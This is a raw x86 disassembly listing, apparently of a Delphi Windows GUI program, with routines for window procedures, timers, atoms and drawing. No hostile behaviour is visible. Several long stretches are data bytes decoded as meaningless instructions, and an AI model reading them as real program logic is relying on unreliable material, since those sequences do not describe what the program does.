mov esi eax
xor edx edx
mov eax esi
call sub_41942c
mov [ esi + 0x30 ] 0x1
push esi
add esp 0xfffffff0
call sub_4035b4
push sub_426920
call sub_41a4bc
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
js r-xdata
mov eax esi
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
mov [ ecx ] dl
inc ecx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
pop esi
pop ebx
retn
outsb
push ebx
push 0x5653776f
test dl dl
je r-xdata
mov [ ecx ] dl
inc ecx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
sub_42688c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419478
test bl bl
jle r-xdata
call sub_41a554
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4268c0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45e634
mov cl 0x1
sub_4268e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4034e0
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_426920
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42694a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4269b8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_45502c
mov [ ebp - 0x14 ] eax
call sub_454f48
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_426a7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_426a4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a54
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df80
retn
sub_426a54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426a82
mov eax [ ebp - 0x14 ]
call sub_4550e0
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_454f50
retn
sub_426b58
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408b90
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_426bf3
add [ edi ] cl
add [ eax ] al
add [ eax - 0x3bffb8d9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ edi + 0x31040047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x5fffb8d9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ edi + 0x32080047 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004727 ] al
xor [ edi ] eax
add [ eax ] al
add [ eax ] al
jl r-xdata
xor [ edi ] al
add [ eax ] al
add [ eax ] al
insb
daa
inc edi
add [ eax + esi ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] ch
inc edi
add [ edx + esi + 0x47 ] al
inc edi
add [ eax + esi + 0x47 ] bh
add [ eax ] al
js r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d05
retn
cmp [ rw-data ] 0x0
je r-xdata
add [ eax ] al
xor al 0x27
inc edi
add [ eax ] dl
xor [ edi ] al
add [ eax ] al
add [ eax ] al
push 0x84004727
xor al [ edi ]
add [ eax ] al
inc edi
add [ eax + 0x4731 ] ch
add [ eax ] al
add [ edi + 0x47 ] dh
add [ eax ] dl
xor [ edi ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a68
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
das
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dh
daa
inc edi
add al dh
xor [ edi ] eax
add [ eax ] al
add [ eax ] al
sub al 0x27
inc edi
add [ eax ] dh
xor al [ edi ]
add [ eax ] al
add [ eax ] al
sub [ edi ] ah
inc edi
add [ eax + esi + 0x47 ] dh
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_426cfe
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc edi
add ah dl
sub_426d08
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403db4
call sub_426b58
mov eax [ r-xdata ]
call sub_4132b0
mov eax [ r-xdata ]
call sub_413350
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
sub_426d48
dec esp
insd
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
or al 0x62
jae r-xdata
insb
push ebx
je r-xdata
fsubr [ esi + 0x42 ]
outsd
je r-xdata
outsb
or esp [ gs : edx + 0x73 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x6d ] cl
inc edx
add [ ecx ] cl
bound esi [ ebx + 0x4c ]
outsd
ja r-xdata
or [ ebp + 0x78 ] al
je r-xdata
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc esp
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
add [ eax ] dh
xor al [ eax ]
or al 0x5c
outsd
insd
dec esp
imul ebp [ esi + 0x65 ] 0x4c73620a
je r-xdata
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
arpl [ ebp + 0x72 ] sp
or [ ebp + 0x78 ] al
je r-xdata
push edx
or esp [ edx + 0x73 ]
jb r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
hlt
add al dh
xchg esp eax
inc ecx
add ah ch
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
imul esp [ edi + 0x68 ] 0x6e694c74
or [ gs : edx + 0x73 ] ah
push ebx
jo r-xdata
imul ebp [ esi + 0x65 ] 0x5273620b
add [ eax ] ch
xor al [ eax ]
inc esp
je r-xdata
jae r-xdata
or [ fs : edx + 0x73 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x78450864
je r-xdata
cdq
mov ah 0x8f
inc ebx
add [ eax + eax ] dh
call [ esi + eax + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000d ] al
outsd
outsb
jae r-xdata
add bh bh
shl dl 0x43
insb
jmp [ eax - 0x2a ]
add ah ah
xchg [ ebx ] eax
pop ebx
add [ eax ] al
inc ecx
add [ ebx + ebx * 4 - 0x79afffbf ] bh
xchg esp eax
cwde
insb
jae r-xdata
xor al 0x40
add [ ebp + esi * 8 + 0x32280043 ] dl
inc eax
add [ edx + esi + 0x40 ] al
add [ esp + ebx * 2 ] cl
in al dx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jo r-xdata
insd
inc edx
add [ eax + 0x1 ] ch
add bh bh
mov esp 0x1004286
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
insb
loopne r-xdata
outsb
je r-xdata
cmc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
outsb
inc edx
insb
jae r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbd90 ] cl
jo r-xdata
inc ecx
add [ eax + ebx * 4 + 0x41 ] bh
add [ eax - 0x69 ] cl
inc ecx
add [ eax + ebx * 4 - 0x667bffbf ] cl
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
pop eax
jo r-xdata
add [ eax + 0x53080010 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx - 0x3f010000 ] bl
loop r-xdata
xchg [ edx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ ebx + 0x33 ] esi
mov eax r-xdata
call sub_403db4
call sub_426b58
mov eax [ r-xdata ]
call sub_4132b0
mov eax [ r-xdata ]
call sub_413350
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4132fc
retn
ror [ eax + 0x300426d ] 0xb
push esp
inc edx
jbe r-xdata
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ edx + ecx * 4 + 0x10042 ] ch
out dx eax
[ esp + ecx * 4 + 0x42 ]
cdq
add [ eax + eax ] al
xor al [ eax ]
cld
mov al [ edx ]
adc al 0x41
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
add [ eax + 0x23 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + 0x42 ] dh
add [ eax + 0x44004270 ] dl
add [ eax ] al
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ esi ] cl
push eax
popad
jb r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
insd
inc edx
add [ ecx + 0x1 ] ch
add bh bh
fadd [ esi + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx - 0x63010000 ] bl
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push ebx
push 0x1657061
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ ebp + ebp * 2 + 0x62050042 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edx + 0x43 ] ah
inc ebp
js r-xdata
outsd
js r-xdata
inc edx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x7a ] dl
inc ebx
or [ edx + 0x73 ] esp
bound esi [ ebx + 0x46 ]
jb r-xdata
imul ebp [ esi + 0x65 ] 0x4273620c
add ah cl
outsb
inc edx
add [ ecx + eax ] ch
add [ edx - 0x6463ffbd ] dh
inc ecx
add ah ah
xor al 0x40
push esp
outsd
jo r-xdata
insd
or [ gs : edx + 0x73 ] esp
sub_4286f4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41cc14
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_412618
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_412618
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_412618
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_41d3f0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_41cc14
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_412618
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_412618
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_412618
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_41d3f0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4287e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_41cc14
mov ecx edi
mov edx esi
mov eax ebx
call sub_41d3c4
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_41d364
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_428824
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_41cd40
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_41cd10
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_41ccf4
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_41cc14
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_41d030
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_41cd10
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_41ccf4
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_41cc14
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41d030
mov eax [ ebp - 0x4 ]
call sub_43db50
push eax
mov eax [ ebp - 0x4 ]
call sub_43db94
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41d428
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_428916 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x1c ]
call sub_4286f4
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_412640
lea eax [ ebp - 0x1c ]
call sub_4286f4
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_412640
lea eax [ ebp - 0x1c ]
call sub_4286f4
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4287e4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4287e4
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4287e4
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4287e4
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4287e4
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4287e4
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4287e4
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4287e4
pop ecx
sub_428aac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41942c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_428b34
call sub_41a578
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_428afc
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_428ba8
mov eax [ esi + 0x34 ]
call sub_41a62c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419478
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_428b34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_428b6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428ba8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_428c27
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c2e
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
sub_428c84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ ebp + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
lea eax [ edx ]
mov al 0x8d
inc edx
add [ edx + eax ] bl
add [ eax ] al
je r-xdata
inc esp
add [ eax ] dh
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + ebx * 2 + 0x4f940043 ] cl
inc esp
add [ eax - 0x3ffbbac ] dh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insb
mov es [ edx ]
adc [ esp + eax * 2 ] 0xa8
sbb al 0x44
inc esp
add [ ebx ] dh
inc ebx
jecxz r-xdata
inc edx
add [ edi + ecx * 4 ] dh
inc edx
add [ esp + edx * 2 ] cl
inc edi
jb r-xdata
inc esp
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ edx + ebx * 2 + 0x43 ] bh
add al dh
sbb al [ eax + eax - 0x2c ]
pop edx
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add ah ch
pop eax
inc ebx
add al dh
pop ecx
inc ebx
add [ ebx ] al
add [ ecx ] dl
mov ebp 0xffbaffbc
movsb [ edi ] [ esi ]
mov es [ edx ]
je r-xdata
inc esp
add [ ecx + ecx * 2 + 0x44 ] bh
add al ah
loope r-xdata
push eax
mov edx eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
mov eax edi
mov ecx [ eax ]
inc edx
jne r-xdata
xor edx edx
mov eax edi
call sub_43e2c0
mov [ edi + 0x124 ] esi
je r-xdata
call [ ecx + 0x64 ]
outsb
lea eax [ eax ]
les ecx [ ebp + 0xc070042 ]
push esp
inc edi
jb r-xdata
mov [ edi + 0x120 ] sub_429218
mov edx esi
and al 0x1
add [ eax ] al
jne r-xdata
je r-xdata
add bh al
xchg [ eax ] esp
inc edx
jne r-xdata
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
sbb [ edx - 0x2974ffbe ] dl
je r-xdata
add [ eax ] eax
add [ eax ] bl
xchg edx eax
inc edx
add [ ebx - 0x7438742a ] cl
or bh bh
push ecx
push 0xdb84c78b
outsb
int3
sub_428de8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_43588c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413918
xor edx edx
mov eax edi
call sub_43e06c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43e2c0
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_429218
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_428e6c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_413bb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4407b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_428ea4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_428f09
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
